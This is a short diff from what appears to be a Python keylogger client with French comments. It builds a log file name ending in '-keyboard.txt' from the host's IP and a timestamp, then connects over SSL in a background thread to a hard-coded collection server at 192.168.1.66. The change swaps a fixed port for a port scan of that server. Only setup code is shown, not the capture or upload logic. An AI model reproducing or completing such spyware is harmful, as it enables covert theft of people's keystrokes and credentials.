@@ -6,11 +6,11 @@ ip_host = socket.gethostbyname(socket.gethostname())
 time = strftime("%Y-%m-%d_%H-%M-%S")
 file_name = ip_host + "-" + time + "-keyboard.txt"
 ip_server = "192.168.1.66"
-port = 8080
+ports = functions.scan_port(ip_server)
 client_ssl = Queue()
 
 # Utiliser un thread pour se connecter
-thread = threading.Thread(target=functions.connexion, args=(ip_server, port, client_ssl))
+thread = threading.Thread(target=functions.connexion, args=(ip_server, ports, client_ssl))
 thread.start()
 
 sys = functions.detect_os()
